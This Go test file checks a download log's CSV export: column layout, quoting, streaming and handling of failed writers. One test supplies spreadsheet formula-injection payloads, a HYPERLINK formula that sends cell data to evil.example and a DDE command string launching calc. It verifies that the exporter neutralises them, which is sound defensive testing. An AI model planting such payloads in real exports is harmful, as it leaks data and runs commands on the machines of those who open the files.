package downloadlog

import (
	"bytes"
	"encoding/csv"
	"errors"
	"reflect"
	"strings"
	"testing"
	"time"
)

func TestWriteCSV(t *testing.T) {
	when := time.Date(2026, 3, 1, 12, 0, 0, 123000000, time.UTC)
	entries := []Entry{
		{
			ID: 7, Time: when, ClientIP: "10.0.0.5", ForwardedBy: "10.9.9.9",
			Ecosystem: "cargo", Upstream: "cargo", Package: "cfg-if", Version: "1.0.0",
			Artifact: "cfg-if-1.0.0.crate", Digest: "sha256:ab", Kind: KindPackage,
			Method: "GET", Path: "/v1/cargo/api/v1/crates/cfg-if/1.0.0/download", Status: 200,
			Outcome: OutcomeServed, Cache: "MISS", Bytes: 7934, Size: 7934, DurationMs: 12,
			Subject: "alice", Tenant: "team-a", AuthMethod: "token", UserAgent: "cargo/1.84.0", TraceID: "4bf92f",
		},
		{
			ID: 8, Time: when.Add(time.Second), ClientIP: "2001:db8::1",
			Ecosystem: "go", Upstream: "go", Package: "github.com/pkg/errors", Version: "v0.9.1",
			Kind: KindPackage, Method: "GET", Path: "/v1/go/github.com/pkg/errors/@v/v0.9.1.zip", Status: 403,
			Outcome: OutcomeBlocked, Gate: "policy", Code: "malicious",
			Reason: `commit "deadbeef" flagged, see report`,
		},
	}
	var buf bytes.Buffer
	if err := WriteCSV(&buf, entries); err != nil {
		t.Fatal(err)
	}
	rows, err := csv.NewReader(&buf).ReadAll()
	if err != nil {
		t.Fatalf("the export is not valid CSV: %v", err)
	}
	if len(rows) != 3 {
		t.Fatalf("%d rows, want a header and two entries", len(rows))
	}
	if !reflect.DeepEqual(rows[0], csvHeader) {
		t.Fatalf("header = %v", rows[0])
	}
	want := []string{
		"2026-03-01T12:00:00.123Z", "10.0.0.5", "10.9.9.9", "cargo", "cargo", "cfg-if", "1.0.0",
		"cfg-if-1.0.0.crate", "package", "served", "200", "", "", "", "MISS",
		"7934", "7934", "12", "alice", "team-a", "token", "cargo/1.84.0",
		"GET", "/v1/cargo/api/v1/crates/cfg-if/1.0.0/download", "sha256:ab", "4bf92f", "7", "", "",
	}
	if !reflect.DeepEqual(rows[1], want) {
		t.Fatalf("first entry row\n %q\nwant\n %q", rows[1], want)
	}
	// A value with quotes and commas survives the round trip.
	col := map[string]int{}
	for i, name := range csvHeader {
		col[name] = i
	}
	if got := rows[2][col["reason"]]; got != `commit "deadbeef" flagged, see report` {
		t.Fatalf("reason = %q", got)
	}
	if got := rows[2][col["gate"]] + "/" + rows[2][col["code"]] + "/" + rows[2][col["outcome"]]; got != "policy/malicious/blocked" {
		t.Fatalf("gate/code/outcome = %q", got)
	}
	for _, row := range rows {
		if len(row) != len(csvHeader) {
			t.Fatalf("row has %d columns, want %d", len(row), len(csvHeader))
		}
	}
}

// Client-chosen values that a spreadsheet would run as a formula are exported
// as text.
func TestWriteCSVNeutralizesFormulas(t *testing.T) {
	e := Entry{
		ID: 1, Time: time.Unix(0, 0).UTC(), ClientIP: "10.0.0.5", Ecosystem: "npm", Upstream: "npm",
		Package:   `=HYPERLINK("https://evil.example/?"&A1,"click")`,
		Version:   "+1.0.0",
		Artifact:  "-rf.tgz",
		UserAgent: "@SUM(1+1)*cmd|' /C calc'!A0",
		Subject:   "\tleading-tab",
		Tenant:    "plain",
		Path:      "/v1/npm/=x",
		Kind:      KindPackage, Outcome: OutcomeServed, Status: 200, Method: "GET",
	}
	var buf bytes.Buffer
	if err := WriteCSV(&buf, []Entry{e}); err != nil {
		t.Fatal(err)
	}
	rows, err := csv.NewReader(&buf).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	col := map[string]int{}
	for i, name := range csvHeader {
		col[name] = i
	}
	row := rows[1]
	for _, name := range []string{"package", "version", "artifact", "user_agent", "subject"} {
		if got := row[col[name]]; !strings.HasPrefix(got, "'") {
			t.Errorf("%s = %q: a formula-like value must be prefixed with an apostrophe", name, got)
		}
	}
	for name, want := range map[string]string{"tenant": "plain", "path": "/v1/npm/=x", "client_ip": "10.0.0.5"} {
		if got := row[col[name]]; got != want {
			t.Errorf("%s = %q, want it unchanged (%q)", name, got, want)
		}
	}
	// Negative-looking numbers are numbers the exporter wrote itself, not text.
	for _, name := range []string{"status", "bytes", "size", "duration_ms", "id"} {
		if got := row[col[name]]; strings.HasPrefix(got, "'") {
			t.Errorf("numeric column %s = %q", name, got)
		}
	}
}

func TestWriteCSVEmpty(t *testing.T) {
	var buf bytes.Buffer
	if err := WriteCSV(&buf, nil); err != nil {
		t.Fatal(err)
	}
	if got := strings.TrimSpace(buf.String()); got != strings.Join(csvHeader, ",") {
		t.Fatalf("an empty export = %q, want just the header", got)
	}
}

// The streaming writer and the slice form produce the same document, and the
// streaming one hands rows to the underlying writer as it goes instead of
// holding the export in memory.
func TestCSVWriterStreams(t *testing.T) {
	entries := make([]Entry, 2000)
	for i := range entries {
		entries[i] = Entry{
			ID: uint64(i + 1), Time: time.Date(2026, 3, 1, 12, 0, i%60, 0, time.UTC),
			ClientIP: "10.0.0.5", Ecosystem: "cargo", Package: "cfg-if", Version: "1.0.0",
			Kind: KindPackage, Outcome: OutcomeServed, Status: 200, Bytes: 7934,
		}
	}
	var whole bytes.Buffer
	if err := WriteCSV(&whole, entries); err != nil {
		t.Fatal(err)
	}

	sink := &countingSink{}
	cw, err := NewCSVWriter(sink)
	if err != nil {
		t.Fatal(err)
	}
	for i := range entries {
		if err := cw.Write(&entries[i]); err != nil {
			t.Fatal(err)
		}
	}
	if sink.writes == 0 {
		t.Error("nothing reached the writer before Flush: the export is being held in memory")
	}
	if err := cw.Flush(); err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(sink.buf.Bytes(), whole.Bytes()) {
		t.Error("the streamed document differs from WriteCSV's")
	}
}

// A writer that fails — a client that went away mid-export — is reported, so
// the caller stops producing rows.
func TestCSVWriterReportsAFailedWriter(t *testing.T) {
	cw, err := NewCSVWriter(failingWriter{})
	if err != nil {
		t.Fatal(err)
	}
	e := Entry{ID: 1, Time: time.Unix(0, 0), ClientIP: "10.0.0.5", Package: strings.Repeat("p", 300)}
	failed := false
	for i := 0; i < 1000 && !failed; i++ {
		failed = cw.Write(&e) != nil
	}
	if !failed {
		t.Error("Write kept succeeding on a writer that fails")
	}
	if err := cw.Flush(); err == nil {
		t.Error("Flush reported no error on a writer that fails")
	}
}

type countingSink struct {
	buf    bytes.Buffer
	writes int
}

func (s *countingSink) Write(p []byte) (int, error) {
	s.writes++
	return s.buf.Write(p)
}

type failingWriter struct{}

func (failingWriter) Write([]byte) (int, error) { return 0, errors.New("the client went away") }
